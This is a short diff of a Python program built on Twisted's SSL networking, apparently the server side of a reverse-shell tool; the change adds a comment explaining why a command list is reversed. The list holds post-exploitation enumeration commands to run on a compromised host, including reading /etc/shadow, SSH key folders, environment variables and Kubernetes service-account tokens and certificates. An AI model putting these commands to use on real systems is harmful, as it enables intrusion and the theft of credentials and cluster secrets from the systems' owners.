@@ -2,6 +2,7 @@ from twisted.internet import ssl, reactor
 from twisted.internet.protocol import Protocol, Factory
 
 enum_commands = ['whoami','id','hostname','cat /etc/passwd', 'cat /etc/shadow', 'cat /etc/group','ls -l ~/.ssh/','sudo -l','ps aux','uname -a','env','cat /run/secrets/kubernetes.io/serviceaccount/token','cat /var/run/secrets/kubernetes.io/serviceaccount/token','cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt','strace ls']
+# Reverse enumeration commands so that the commands are sent in order when popped off the stack
 enum_commands.reverse()
 
 
